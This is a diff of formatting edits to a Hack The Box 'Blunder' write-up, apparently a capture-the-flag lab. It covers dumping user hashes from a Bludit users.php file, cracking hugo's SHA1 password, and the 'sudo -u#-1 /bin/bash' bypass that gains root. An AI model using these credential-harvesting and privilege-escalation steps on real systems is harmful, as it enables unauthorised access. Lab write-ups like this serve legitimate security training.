@@ -266,6 +266,7 @@ wordlist = open_ressources('/root/htb-blunder/wordlist.txt') # wordlist of the p
  ```
 ### Obtaining hash of other users
  Going back to the databases directory(*/var/www/bludit-3.10.0.a/bl-content/databases/users.php*) to get all the usernames and passwords
+ <br />
 ![Image of database](https://github.com/friend-col/hack-the-box--blunder/blob/master/img/database_results_of_users.jpg)
 
 ### Finding out Hash Algorithm
@@ -273,20 +274,9 @@ Using hashid, it is shown that it is a *SHA1* encryption
 ```
 command: hashid faca404fd5c0a31cf1897b823c695c85cffeb98d
 ```
-<br />
+
 #### results of the hash algorithm
-```
-Analyzing 'faca404fd5c0a31cf1897b823c695c85cffeb98d'
-[+] SHA-1 
-[+] Double SHA-1 
-[+] RIPEMD-160 
-[+] Haval-160 
-[+] Tiger-160 
-[+] HAS-160 
-[+] LinkedIn 
-[+] Skein-256(160) 
-[+] Skein-512(160)
-```
+![Image of hash_results](https://github.com/friend-col/hack-the-box--blunder/blob/master/img/result_of_hash.jpg)
 ### Decryption 
 Using an online decryptor, hugo's password is *Password120*
 ## Privilege Escalation
@@ -303,7 +293,7 @@ User hugo may run the following commands on blunder:
     (ALL, !root) /bin/bash
 ```
 From results, it is shown that hugo is able to execute the command /bin/bash as a sudo user with !root restriction. Therefore, using 
-[the sudo bash bypass command:]https://n0w4n.nl/sudo-security-bypass/) sudo -u#-1 /bin/bash.
+[the sudo bash bypass command]https://n0w4n.nl/sudo-security-bypass/): sudo -u#-1 /bin/bash.
 <br />
 This command turn hugo into a root user. Navigate into the root home directory to get the root flag. 
 ```
